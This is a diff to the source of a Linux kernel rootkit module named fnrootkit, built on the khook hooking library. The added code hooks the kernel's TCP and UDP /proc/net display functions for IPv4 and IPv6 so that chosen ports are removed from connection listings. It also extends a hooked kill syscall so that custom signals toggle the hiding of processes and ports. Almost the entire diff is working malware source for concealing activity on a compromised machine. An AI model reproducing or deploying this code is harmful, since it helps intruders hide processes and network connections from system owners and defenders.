@@ -1,15 +1,122 @@
 #include "../inc/fnrootkit.h"
 
-#include <linux/fs.h>
-#include <linux/dirent.h>
-#include <linux/fdtable.h>
 #include <linux/syscalls.h>
 
 #include "../inc/def.h"
-#include "../inc/proc.h"
 #include "../inc/util.h"
 
 #include "../3rd_party/khook/engine.c"
+
+/*************************HIDE CONNECTIONS*******************************/
+#include "../inc/net.h"
+
+#include <net/inet_sock.h>
+#include <linux/seq_file.h>
+
+LIST_HEAD(hidden_port_list);
+
+KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
+static int khook_tcp4_seq_show(struct seq_file *seq, void *v) {
+    int ret;
+    char port[12];
+    struct hidden_port *hp;
+
+    ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
+
+    list_for_each_entry (hp, &hidden_port_list, list) {
+        sprintf(port, ":%04X", hp->port);
+
+        if (strnstr(
+                    seq->buf + seq->count - PROC_NET_ROW_LEN,
+                    port,
+                    PROC_NET_ROW_LEN
+                )) {
+            seq->count -= PROC_NET_ROW_LEN;
+            break;
+        }
+    }
+
+    return ret;
+}
+
+KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);
+static int khook_udp4_seq_show(struct seq_file *seq, void *v) {
+    int ret;
+    char port[12];
+    struct hidden_port *hp;
+
+    ret = KHOOK_ORIGIN(udp4_seq_show, seq, v);
+
+    list_for_each_entry (hp, &hidden_port_list, list) {
+        sprintf(port, ":%04X", hp->port);
+
+        if (strnstr(
+                    seq->buf + seq->count - PROC_NET_ROW_LEN,
+                    port,
+                    PROC_NET_ROW_LEN
+                )) {
+            seq->count -= PROC_NET_ROW_LEN;
+            break;
+        }
+    }
+
+    return ret;
+}
+
+KHOOK_EXT(int, tcp6_seq_show, struct seq_file *, void *);
+static int khook_tcp6_seq_show(struct seq_file *seq, void *v) {
+    int ret;
+    char port[12];
+    struct hidden_port *hp;
+
+    ret = KHOOK_ORIGIN(tcp6_seq_show, seq, v);
+
+    list_for_each_entry (hp, &hidden_port_list, list) {
+        sprintf(port, ":%04X", hp->port);
+
+        if (strnstr(
+                    seq->buf + seq->count - PROC_NET6_ROW_LEN,
+                    port,
+                    PROC_NET6_ROW_LEN
+                )) {
+            seq->count -= PROC_NET6_ROW_LEN;
+            break;
+        }
+    }
+
+    return ret;
+}
+
+KHOOK_EXT(int, udp6_seq_show, struct seq_file *, void *);
+static int khook_udp6_seq_show(struct seq_file *seq, void *v) {
+    int ret;
+    char port[12];
+    struct hidden_port *hp;
+
+    ret = KHOOK_ORIGIN(udp6_seq_show, seq, v);
+
+    list_for_each_entry (hp, &hidden_port_list, list) {
+        sprintf(port, ":%04X", hp->port);
+
+        if (strnstr(
+                    seq->buf + seq->count - PROC_NET6_ROW_LEN,
+                    port,
+                    PROC_NET6_ROW_LEN
+                )) {
+            seq->count -= PROC_NET6_ROW_LEN;
+            break;
+        }
+    }
+
+    return ret;
+}
+
+/**************************HIDE PROCESSES********************************/
+#include "../inc/proc.h"
+
+#include <linux/fs.h>
+#include <linux/dirent.h>
+#include <linux/fdtable.h>
 
 KHOOK_EXT(long, __x64_sys_getdents, const struct pt_regs *);
 static long khook___x64_sys_getdents(const struct pt_regs *pt_regs) {
@@ -137,11 +244,14 @@ static long khook___x64_sys_kill(const struct pt_regs *pt_regs) {
     int sig = (int) pt_regs->si;
 
     switch (sig) {
-    case SIGINVIS:
+    case SIGINVISPROC:
         if ((task = find_task_struct(pid)))
-            toggle_invisability(task);
+            toggle_proc_invisability(task);
         else
             return ESRCH;
+        break;
+    case SIGINVISPORT:
+        toggle_port_invisability(pid);
         break;
     default:
         KHOOK_ORIGIN(__x64_sys_kill, pt_regs);
@@ -150,6 +260,7 @@ static long khook___x64_sys_kill(const struct pt_regs *pt_regs) {
     return 0;
 }
 
+/********************************LKM*************************************/
 static int __init fnrootkit_init(void) {
     khook_init();
 
